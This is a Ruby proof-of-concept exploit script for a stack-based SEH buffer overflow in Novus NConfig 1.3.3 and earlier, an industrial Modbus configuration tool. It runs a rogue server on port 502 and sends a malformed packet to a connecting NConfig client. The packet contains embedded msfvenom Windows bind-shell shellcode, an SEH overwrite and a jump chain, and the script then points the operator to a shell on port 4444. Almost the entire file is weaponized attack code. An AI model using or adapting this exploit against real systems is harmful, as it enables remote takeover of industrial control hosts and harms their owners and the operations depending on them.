#! /usr/bin/env ruby
# PoC -> Novus NConfig
# james fitts

$LOAD_PATH << '/home/james/code/msf4/lib'

require 'socket'
require 'rex'

=begin
This module exploits a stack based buffer overflow
found in Novus NConfig <= 1.3.3. The vulnerability
is triggered due to the values used at offset 5/6
inside the header being used as the length parameter
of the ws2_31!recv function. This allows a malicious
attacker to supply an overly large packet and overflow
the fixed size stack buffer

To trigger, configure TCP configuration on NConfig to
connect to this server, then "Search and Configure".
You will need to do this several times, so in the
"Search and Configure" screen, click "Options" to
reset it and search again.
=end

# Payload => windows/shell_bind_tcp
# ./msfvenom -p windows/shell_bind_tcp -b '\x0a\x0d\x20' -f ruby --arch x86 --platform windows
p =  "\x41" * 15
p << "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50"
p << "\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26"
p << "\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7"
p << "\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78"
p << "\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3"
p << "\x3a\x49\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01"
p << "\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58"
p << "\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3"
p << "\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a"
p << "\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32"
p << "\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff"
p << "\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b"
p << "\x00\xff\xd5\x6a\x08\x59\x50\xe2\xfd\x40\x50\x40\x50\x68"
p << "\xea\x0f\xdf\xe0\xff\xd5\x97\x68\x02\x00\x11\x5c\x89\xe6"
p << "\x6a\x10\x56\x57\x68\xc2\xdb\x37\x67\xff\xd5\x57\x68\xb7"
p << "\xe9\x38\xff\xff\xd5\x57\x68\x74\xec\x3b\xe1\xff\xd5\x57"
p << "\x97\x68\x75\x6e\x4d\x61\xff\xd5\x68\x63\x6d\x64\x00\x89"
p << "\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66\xc7"
p << "\x44\x24\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50"
p << "\x56\x56\x56\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f"
p << "\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30\x68\x08\x87\x1d"
p << "\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff"
p << "\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72"
p << "\x6f\x6a\x00\x53\xff\xd5"

server = TCPServer.new 502
puts "[+] Listening on '127.0.0.1:502'"

header = "\x00\x00\x00\x00\x13\x88"

buf = Rex::Text.pattern_create(5000)
# nSEH
# jmp$+8
buf[19, 2] = "\xde\xad"
buf[17, 2] = "\x06\xeb"

# SEH
# 0x004b8b40	
# pop ecx/ pop ebp/ retn
# NConfig.exe
buf[22, 2] = "\x00\x4b"
buf[20, 2] = "\x8b\x40"

# Nops / jmp $+1404
buf[24, 8] = "\x41\x41\x77\xe9\x00\x05\x00\x00"

# Payload
buf[76, p.length] = p

pkt = header + buf

client = server.accept
sock_domain, remote_port, remote_hostname, remote_ip = client.peeraddr
puts "[+] Connection from '#{remote_ip}:#{remote_port}'"
puts "[!] Sending malformed modbus packet"

client.puts pkt

puts "[+] Check for shell on port '#{remote_ip}:4444'"
server.recv(1024)
server.close
